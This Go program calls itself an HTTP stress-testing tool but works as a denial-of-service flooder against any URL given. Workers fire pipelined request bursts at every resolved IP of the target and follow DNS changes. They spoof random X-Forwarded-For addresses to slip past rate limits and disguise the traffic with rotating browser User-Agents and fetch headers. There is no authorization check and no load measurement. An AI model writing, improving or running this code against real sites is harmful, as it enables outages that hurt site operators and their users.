// Optimized HTTP Stress Testing Tool with Improved User-Agent and Request Handling
package main

import (
    "bytes"
    "context"
    "crypto/tls"
    "fmt"
    "math/rand"
    "net"
    "net/url"
    "os"
    "os/signal"
    "strconv"
    "strings"
    "sync"
    "syscall"
    "time"
)

var (
    ips         []string
    ipsMutex    sync.Mutex
    rebalanceCh = make(chan []string, 1)
)

var (
    httpMethods  = []string{"GET", "GET", "GET", "POST", "HEAD"}
    languages    = []string{"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9"}
    contentTypes = []string{"application/x-www-form-urlencoded", "application/json", "text/plain"}
)

type StressConfig struct {
    Target     *url.URL
    Threads    int
    Duration   time.Duration
    CustomHost string
    Port       int
    Path       string
}

func init() {
    rand.Seed(time.Now().UnixNano())
}

func main() {
    if len(os.Args) < 4 {
        fmt.Println("Usage: <URL> <THREADS> <DURATION_SEC> [CUSTOM_HOST]")
        os.Exit(1)
    }

    rawURL := os.Args[1]
    threads, _ := strconv.Atoi(os.Args[2])
    durSec, _ := strconv.Atoi(os.Args[3])
    customHost := ""
    if len(os.Args) > 4 {
        customHost = os.Args[4]
    }

    parsedURL, _ := url.Parse(rawURL)
    port := determinePort(parsedURL)
    path := parsedURL.RequestURI()

    cfg := StressConfig{
        Target:     parsedURL,
        Threads:    threads,
        Duration:   time.Duration(durSec) * time.Second,
        CustomHost: customHost,
        Port:       port,
        Path:       path,
    }

    addrs, err := lookupIPv4(parsedURL.Hostname())
	if err != nil {
		fmt.Printf("DNS lookup failed: %v\n", err)
		os.Exit(1)
	}
    updateIPs(addrs)
    fmt.Printf("Resolved IPs: %v\n", addrs)

    go dnsRefresh(parsedURL.Hostname(), 30*time.Second)

    sigCh := make(chan os.Signal, 1)
    signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)

    rootCtx, cancel := context.WithTimeout(context.Background(), cfg.Duration)
    defer cancel()

    go func() {
        select {
        case <-sigCh:
            fmt.Println("Interrupt received")
            cancel()
        case <-rootCtx.Done():
        }
    }()
    fmt.Printf("Starting stress test: %s, threads=%d, duration=%v\n", rawURL, threads, cfg.Duration)
    runManager(rootCtx, cfg)
    fmt.Println("Stress test completed.")
}

type workerEntry struct {
    cancel context.CancelFunc
}

func runManager(ctx context.Context, cfg StressConfig) {
    workers := make(map[string][]workerEntry)
    spawn := func(ip string) {
        wctx, wcancel := context.WithCancel(ctx)
        workers[ip] = append(workers[ip], workerEntry{cancel: wcancel})
        go workerLoop(wctx, cfg, ip)
    }
    rebalance(getSnapshotIPs(), workers, cfg.Threads, spawn)
    for {
        select {
        case <-ctx.Done():
            for _, list := range workers {
                for _, w := range list {
                    w.cancel()
                }
            }
            return
        case newIPs := <-rebalanceCh:
            rebalance(newIPs, workers, cfg.Threads, spawn)
        }
    }
}

func workerLoop(ctx context.Context, cfg StressConfig, ip string) {
    ticker := time.NewTicker(60 * time.Millisecond)
    defer ticker.Stop()
    tlsCfg := &tls.Config{ServerName: cfg.Target.Hostname(), InsecureSkipVerify: true}
    for {
        select {
        case <-ctx.Done():
            return
        case <-ticker.C:
            sendBurst(cfg, tlsCfg, ip)
        }
    }
}

func rebalance(ipsList []string, workers map[string][]workerEntry, total int, spawn func(string)) {
    n := len(ipsList)
    if n == 0 {
        return
    }
    base, extra := total/n, total%n
    desired := map[string]int{}
    for i, ip := range ipsList {
        desired[ip] = base
        if i < extra {
            desired[ip]++
        }
    }
    for ip := range workers {
        if _, ok := desired[ip]; !ok {
            for _, w := range workers[ip] {
                w.cancel()
            }
            delete(workers, ip)
        }
    }
    for ip, want := range desired {
        have := len(workers[ip])
        if have < want {
            for i := 0; i < want-have; i++ {
                spawn(ip)
            }
        } else if have > want {
            for i := 0; i < have-want; i++ {
                w := workers[ip][0]
                w.cancel()
                workers[ip] = workers[ip][1:]
            }
        }
    }
    fmt.Printf("[rebalance] desired=%v have=%v\n", desired, mapCounts(workers))
}

func mapCounts(workers map[string][]workerEntry) map[string]int {
	counts := make(map[string]int)
	for ip, list := range workers {
		counts[ip] = len(list)
	}
	return counts
}

func getSnapshotIPs() []string {
    ipsMutex.Lock()
    defer ipsMutex.Unlock()
    out := make([]string, len(ips))
    copy(out, ips)
    return out
}

func dnsRefresh(host string, interval time.Duration) {
    ticker := time.NewTicker(interval)
    defer ticker.Stop()
    for range ticker.C {
        addrs, err := lookupIPv4(host)
        if err == nil {
            updateIPs(addrs)
            select {
            case rebalanceCh <- addrs:
            default:
            }
        }
    }
}

func updateIPs(newIPs []string) {
    ipsMutex.Lock()
    ips = newIPs
    ipsMutex.Unlock()
}

func lookupIPv4(host string) ([]string, error) {
    addrs, err := net.LookupIP(host)
    if err != nil {
        return nil, err
    }
    var out []string
    for _, a := range addrs {
        if ip4 := a.To4(); ip4 != nil {
            out = append(out, ip4.String())
        }
    }
    if len(out) == 0 {
        return nil, fmt.Errorf("no IPv4 for %s", host)
    }
    return out, nil
}

func determinePort(u *url.URL) int {
    if p := u.Port(); p != "" {
        if i, err := strconv.Atoi(p); err == nil {
            return i
        }
    }
    if strings.EqualFold(u.Scheme, "https") {
        return 443
    }
    return 80
}

func sendBurst(cfg StressConfig, tlsCfg *tls.Config, ip string) {
    addr := fmt.Sprintf("%s:%d", ip, cfg.Port)
    conn, err := dialConn(addr, tlsCfg)
    if err != nil {
        return
    }
    defer conn.Close()

    method := httpMethods[rand.Intn(len(httpMethods))]
    for i := 0; i < 250; i++ {
        hdr, body := buildRequest(cfg, method)
        bufs := net.Buffers{hdr}
        if method == "POST" {
            bufs = append(bufs, body)
        }
        if _, err := bufs.WriteTo(conn); err != nil {
            return
        }
    }
}

func dialConn(addr string, tlsCfg *tls.Config) (net.Conn, error) {
    if strings.HasSuffix(addr, ":443") {
        return tls.Dial("tcp", addr, tlsCfg)
    }
    return net.Dial("tcp", addr)
}

var bufPool = sync.Pool{
    New: func() any { return new(bytes.Buffer) },
}

func buildRequest(cfg StressConfig, method string) ([]byte, []byte) {
    buf := bufPool.Get().(*bytes.Buffer)
    buf.Reset()
    defer bufPool.Put(buf)

    hostHdr := cfg.Target.Hostname()
    if cfg.CustomHost != "" {
        hostHdr = cfg.CustomHost
    }

    buf.WriteString(method + " " + cfg.Path + " HTTP/1.1\r\nHost: " + hostHdr + ":" + strconv.Itoa(cfg.Port) + "\r\n")
    writeCommonHeaders(buf)

    var body []byte
    if method == "POST" {
        ct := contentTypes[rand.Intn(len(contentTypes))]
        body = createBody(ct)
        buf.WriteString("Content-Type: " + ct + "\r\nContent-Length: " + strconv.Itoa(len(body)) + "\r\n")
    }

    buf.WriteString("Referer: https://" + hostHdr + "/\r\nConnection: keep-alive\r\n\r\n")
    out := make([]byte, buf.Len())
    copy(out, buf.Bytes())
    return out, body
}

func writeCommonHeaders(buf *bytes.Buffer) {
    buf.WriteString("User-Agent: " + randomUserAgent() + "\r\n")
    buf.WriteString("Accept-Language: " + languages[rand.Intn(len(languages))] + "\r\n")
    buf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n")
    buf.WriteString("Accept-Encoding: gzip, deflate, br, zstd\r\n")
    buf.WriteString("Sec-Fetch-Site: none\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\n")
    buf.WriteString("Upgrade-Insecure-Requests: 1\r\nCache-Control: no-cache\r\n")
    fmt.Fprintf(buf, "X-Forwarded-For: %d.%d.%d.%d\r\n", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

func createBody(ct string) []byte {
    var b bytes.Buffer
    switch ct {
    case "application/x-www-form-urlencoded":
        vals := url.Values{}
        for i := 0; i < 3; i++ {
            vals.Set(randomString(5), randomString(8))
        }
        b.WriteString(vals.Encode())
    case "application/json":
        b.WriteString("{")
        for i := 0; i < 3; i++ {
            if i > 0 {
                b.WriteString(",")
            }
            b.WriteString(fmt.Sprintf("\"%s\":\"%s\"", randomString(5), randomString(8)))
        }
        b.WriteString("}")
    default:
        b.WriteString("text_" + randomString(12))
    }
    return b.Bytes()
}

func randomString(n int) string {
    const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    b := make([]byte, n)
    for i := range b {
        b[i] = letters[rand.Intn(len(letters))]
    }
    return string(b)
}

func randomUserAgent() string {
    osList := []string{"Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64"}
    os := osList[rand.Intn(len(osList))]
    switch rand.Intn(3) {
    case 0:
        v := fmt.Sprintf("%d.0.%d.0", rand.Intn(40)+80, rand.Intn(4000))
        return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, v)
    case 1:
        v := fmt.Sprintf("%d.0", rand.Intn(40)+70)
        return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s", os, v, v)
    default:
        v := fmt.Sprintf("%d.0.%d", rand.Intn(16)+600, rand.Intn(100))
        return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s (KHTML, like Gecko) Version/13.1 Safari/%s", os, v, v)
    }
}
